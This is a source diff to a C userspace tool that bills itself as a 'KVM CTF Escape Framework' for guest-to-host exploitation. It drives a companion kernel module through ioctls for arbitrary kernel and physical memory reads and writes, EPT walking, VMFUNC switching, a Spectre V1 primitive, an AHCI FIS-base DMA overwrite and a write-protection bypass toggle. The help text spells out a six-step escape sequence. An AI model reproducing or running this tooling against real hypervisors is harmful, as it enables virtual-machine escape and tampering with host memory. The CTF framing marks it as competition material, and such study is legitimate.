@@ -1,16 +1,6 @@
 /*
- * KVM Prober - Userspace CTF Tool v3.0
- * Companion tool for kvm_probe_drv.c v3.0-CTF
- * 
- * UPDATES:
- * - Synchronized with kernel module v3.0
- * - Added CTF 2023-2025 challenges
- * - Added VMFUNC/EPT switching
- * - Added IOMMU probing
- * - Added VAPIC backing page read
- * - Added Spectre V1 primitive
- * - Added cache flush operations
- * - Added AHCI FIS base exploit
+ * KVM Prober - Userspace CTF Tool v3.0-FIXED
+ * Fixed: Added all missing IOCTLs, proper CTF hypercall handling
  */
 
 #include <stdio.h>
@@ -22,53 +12,55 @@
 #include <stdint.h>
 #include <errno.h>
 #include <ctype.h>
+#include <sys/mman.h>
 
 #define DEVICE_FILE "/dev/kvm_probe_dev"
 #define MAX_SYMBOL_NAME 128
 
 /* ========================================================================
- * IOCTL Definitions - MUST MATCH KERNEL MODULE
+ * IOCTL Definitions - FIXED to match kernel module
  * ======================================================================== */
 #define IOCTL_BASE 0x4000
 
-/* Symbol operations */
+/* Symbol operations (0x01-0x0F) */
 #define IOCTL_LOOKUP_SYMBOL          (IOCTL_BASE + 0x01)
 #define IOCTL_GET_SYMBOL_COUNT       (IOCTL_BASE + 0x02)
 #define IOCTL_GET_SYMBOL_BY_INDEX    (IOCTL_BASE + 0x03)
 #define IOCTL_GET_VMX_HANDLER_INFO   (IOCTL_BASE + 0x08)
 
-/* Memory read operations */
+/* Memory read operations (0x10-0x1F) */
 #define IOCTL_READ_KERNEL_MEM        (IOCTL_BASE + 0x10)
 #define IOCTL_READ_PHYSICAL_MEM      (IOCTL_BASE + 0x11)
+#define IOCTL_READ_GUEST_MEM         (IOCTL_BASE + 0x12)
 #define IOCTL_MAP_GUEST_MEMORY       (IOCTL_BASE + 0x1D)
 
-/* Memory write operations */
+/* Memory write operations (0x20-0x2F) */
 #define IOCTL_WRITE_KERNEL_MEM       (IOCTL_BASE + 0x20)
 #define IOCTL_WRITE_PHYSICAL_MEM     (IOCTL_BASE + 0x21)
 
-/* Address conversion */
+/* Address conversion (0x30-0x3F) */
 #define IOCTL_VIRT_TO_PHYS           (IOCTL_BASE + 0x38)
 #define IOCTL_WALK_EPT               (IOCTL_BASE + 0x3E)
 
-/* Cache operations */
+/* Cache Operations (0x40-0x4F) */
 #define IOCTL_WBINVD                 (IOCTL_BASE + 0x40)
 #define IOCTL_WRITE_AND_FLUSH        (IOCTL_BASE + 0x42)
 
-/* AHCI */
+/* AHCI Direct Access (0x50-0x5F) */
 #define IOCTL_AHCI_SET_FIS_BASE      (IOCTL_BASE + 0x53)
 
-/* Hypercalls */
+/* Hypercall operations (0x60-0x6F) */
 #define IOCTL_HYPERCALL              (IOCTL_BASE + 0x60)
 #define IOCTL_HYPERCALL_SCAN         (IOCTL_BASE + 0x62)
 
-/* Modern CTF primitives */
+/* ================ MODERN CTF ESCAPE VECTORS ================ */
 #define IOCTL_TEST_VMFUNC            (IOCTL_BASE + 0x70)
 #define IOCTL_IOMMU_PROBE            (IOCTL_BASE + 0x80)
 #define IOCTL_VAPIC_READ_PAGE        (IOCTL_BASE + 0x90)
 #define IOCTL_SPECTRE_V1            (IOCTL_BASE + 0xA0)
 
-/* Control */
-#define IOCTL_SET_TARGETED_BYPASS    (IOCTL_BASE + 0x70)
+/* Control operations */
+#define IOCTL_SET_TARGETED_BYPASS    (IOCTL_BASE + 0xB0)
 
 /* ========================================================================
  * Data Structures - MUST MATCH KERNEL MODULE
@@ -210,7 +202,7 @@ int init_driver(void)
 }
 
 /* ========================================================================
- * CTF Hypercall Challenges (2023-2025)
+ * CTF Hypercall Challenges (2023-2025) - FIXED with proper handling
  * ======================================================================== */
 
 void do_hypercall(unsigned long nr, unsigned long a0, unsigned long a1,
@@ -220,13 +212,16 @@ void do_hypercall(unsigned long nr, unsigned long a0, unsigned long a1,
         .nr = nr, .a0 = a0, .a1 = a1, .a2 = a2, .a3 = a3, .ret = 0
     };
     
+    printf("[*] HC %lu: a0=0x%lx, a1=0x%lx, a2=0x%lx, a3=0x%lx\n", 
+           nr, a0, a1, a2, a3);
+    
     if (ioctl(fd, IOCTL_HYPERCALL, &req) < 0) {
         perror("[-] hypercall failed");
         return;
     }
     
     if (req.ret != 0 && req.ret != ~0UL) {
-        printf("[+] HC %lu: 0x%lx", nr, req.ret);
+        printf("[+] HC %lu returned: 0x%lx", nr, req.ret);
         
         unsigned char *p = (unsigned char *)&req.ret;
         int printable = 1;
@@ -237,6 +232,10 @@ void do_hypercall(unsigned long nr, unsigned long a0, unsigned long a1,
             printf(" (\"%.8s\")", (char *)&req.ret);
         }
         printf("\n");
+    } else if (req.ret == 0) {
+        printf("[+] HC %lu returned 0 (success but no data)\n", nr);
+    } else if (req.ret == ~0UL) {
+        printf("[-] HC %lu returned -1 (not handled by host)\n", nr);
     }
 }
 
@@ -268,18 +267,21 @@ void hypercall_scan(unsigned long start, unsigned long end)
 void ctf_2023(void)
 {
     printf("\n[*] CTF 2023: Host KASLR Leak\n");
+    printf("[*] Attempting to leak host kernel base...\n");
     do_hypercall(1000, 0, 0, 0, 0);
 }
 
 void ctf_2024(void)
 {
     printf("\n[*] CTF 2024: Arbitrary Physical Read\n");
+    printf("[*] Attempting to read physical address 0x1000...\n");
     do_hypercall(1001, 0x1000, 0, 0, 0);
 }
 
 void ctf_2025(void)
 {
     printf("\n[*] CTF 2025: EPT Violation Injection\n");
+    printf("[*] Attempting to inject EPT violation at 0xdead0000...\n");
     do_hypercall(1002, 0xdead0000, 0, 0, 0);
 }
 
@@ -413,8 +415,19 @@ void map_guest(void)
 }
 
 /* ========================================================================
- * Modern CTF Escape Primitives
+ * Modern CTF Escape Primitives - FIXED with proper handling
  * ======================================================================== */
+
+void set_targeted_bypass(int enable)
+{
+    printf("[*] Setting targeted bypass: %s\n", enable ? "enabled" : "disabled");
+    
+    if (ioctl(fd, IOCTL_SET_TARGETED_BYPASS, &enable) < 0) {
+        perror("[-] set_targeted_bypass failed");
+    } else {
+        printf("[+] Targeted bypass set\n");
+    }
+}
 
 void vmfunc_switch(int eptp_index)
 {
@@ -437,7 +450,7 @@ void walk_ept(unsigned long eptp, unsigned long gpa)
     printf("[*] Walking EPT (5-level support): EPTP=0x%lx, GPA=0x%lx\n", eptp, gpa);
     
     if (ioctl(fd, IOCTL_WALK_EPT, &req) < 0 || req.status != 0) {
-        printf("[-] EPT walk failed\n");
+        printf("[-] EPT walk failed (status: %d)\n", req.status);
         return;
     }
     
@@ -462,7 +475,7 @@ void probe_iommu(void)
     printf("[*] Probing IOMMU/DMAR structures\n");
     
     if (ioctl(fd, IOCTL_IOMMU_PROBE, buffer) < 0) {
-        printf("[-] IOMMU probe failed\n");
+        perror("[-] IOMMU probe failed");
         return;
     }
     
@@ -477,7 +490,7 @@ void read_vapic(void)
     printf("[*] Reading VAPIC backing page\n");
     
     if (ioctl(fd, IOCTL_VAPIC_READ_PAGE, buffer) < 0) {
-        printf("[-] VAPIC read failed\n");
+        perror("[-] VAPIC read failed");
         return;
     }
     
@@ -543,7 +556,8 @@ void ahci_set_fis(int port, uint64_t fis_base)
 {
     struct ahci_fis_request req = {
         .port = port,
-        .fis_base = fis_base
+        .fis_base = fis_base,
+        .clb_base = 0
     };
     
     printf("[*] Setting AHCI port %d FIS base to 0x%lx\n", port, fis_base);
@@ -554,6 +568,7 @@ void ahci_set_fis(int port, uint64_t fis_base)
         perror("[-] AHCI FIS set failed");
     } else {
         printf("[+] FIS base set - trigger device I/O to overwrite target\n");
+        printf("[*] To trigger: read/write to SATA disk or port MMIO\n");
     }
 }
 
@@ -585,8 +600,8 @@ void list_symbols(int max_count)
     for (unsigned int i = 0; i < count; i++) {
         struct symbol_request req = {0};
         unsigned int idx = i;
-        if (ioctl(fd, IOCTL_GET_SYMBOL_BY_INDEX, &idx) >= 0 &&
-            ioctl(fd, IOCTL_GET_SYMBOL_BY_INDEX, &req) >= 0) {
+        if (ioctl(fd, IOCTL_GET_SYMBOL_BY_INDEX, &idx) == 0 &&
+            ioctl(fd, IOCTL_GET_SYMBOL_BY_INDEX, &req) == 0) {
             printf("  [%u] %-40s 0x%lx\n", i, req.name, req.address);
         }
     }
@@ -636,7 +651,7 @@ void virt_to_phys(unsigned long virt_addr)
 void print_help(void)
 {
     printf("╔════════════════════════════════════════════════════════════════════╗\n");
-    printf("║     KVM CTF Escape Framework v3.0 - Guest-to-Host Exploitation     ║\n");
+    printf("║     KVM CTF Escape Framework v3.0-FIXED - Guest-to-Host Exploit   ║\n");
     printf("║                 No validation - Full freedom                       ║\n");
     printf("║                 NO CR0 WP WARNING - Fixed!                        ║\n");
     printf("╚════════════════════════════════════════════════════════════════════╝\n\n");
@@ -656,6 +671,7 @@ void print_help(void)
     printf("  map_guest             - Safe guest memory scan (no crash)\n\n");
     
     printf("MODERN ESCAPE PRIMITIVES:\n");
+    printf("  bypass <0/1>          - Enable/disable targeted WP bypass\n");
     printf("  vmfunc <index>        - VMFUNC EPTP switching\n");
     printf("  ept_walk <eptp> <gpa> - Walk EPT (5-level support)\n");
     printf("  iommu                 - Probe IOMMU/DMAR structures\n");
@@ -671,15 +687,17 @@ void print_help(void)
     printf("  vmx                   - Show VMX handlers\n");
     printf("  v2p <addr>            - Virtual to physical conversion\n\n");
     
-    printf("EXAMPLES:\n");
-    printf("  sudo ./kvm_prober ctf2023\n");
-    printf("  sudo ./kvm_prober rp 0xfea0e000 0x1000\n");
-    printf("  sudo ./kvm_prober ept_walk 0x12345000 0x80000000\n");
-    printf("  sudo ./kvm_prober ahci_fis 0 0xdeadbe00\n");
+    printf("EXPLOIT SEQUENCE:\n");
+    printf("  Step 1: ctf2023        - Leak host KASLR\n");
+    printf("  Step 2: map_guest      - Find guest memory regions\n");
+    printf("  Step 3: ept_walk ...   - Map guest to host physical\n");
+    printf("  Step 4: ahci_fis ...   - Set up DMA write primitive\n");
+    printf("  Step 5: wf ...         - Write to host memory\n");
+    printf("  Step 6: ctf2025        - Trigger flag\n\n");
 }
 
 /* ========================================================================
- * Main
+ * Main - FIXED with all commands
  * ======================================================================== */
 
 int main(int argc, char *argv[])
@@ -716,7 +734,9 @@ int main(int argc, char *argv[])
     else if (strcmp(argv[1], "map_guest") == 0)
         map_guest();
     
-    /* Modern primitives */
+    /* Modern primitives - FIXED: added all missing */
+    else if (strcmp(argv[1], "bypass") == 0 && argc > 2)
+        set_targeted_bypass(atoi(argv[2]));
     else if (strcmp(argv[1], "vmfunc") == 0 && argc > 2)
         vmfunc_switch(atoi(argv[2]));
     else if (strcmp(argv[1], "ept_walk") == 0 && argc > 3)
